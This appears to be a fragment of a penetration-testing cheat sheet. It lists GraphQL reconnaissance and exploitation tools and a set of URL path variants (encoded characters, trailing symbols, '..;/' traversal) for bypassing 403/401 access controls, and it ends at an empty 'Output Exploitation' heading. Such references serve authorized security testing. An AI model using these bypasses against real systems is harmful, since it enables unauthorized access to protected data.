# GraphQL Tools

| Tool | Purpose |
|------|---------|
| GraphCrawler | Schema discovery |
| graphw00f | Fingerprinting |
| clairvoyance | Schema reconstruction |
| InQL | Burp extension |
| GraphQLmap | Exploitation |

---

## Endpoint Bypass Techniques

When receiving 403/401, try these bypasses:

```bash
# Original blocked request
/api/v1/users/sensitivedata → 403

# Bypass attempts
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata?
/api/v1/users/sensitivedata/
/api/v1/users/sensitivedata??
/api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09
/api/v1/users/sensitivedata#
/api/v1/users/sensitivedata&details
/api/v1/users/..;/sensitivedata
```

---

## Output Exploitation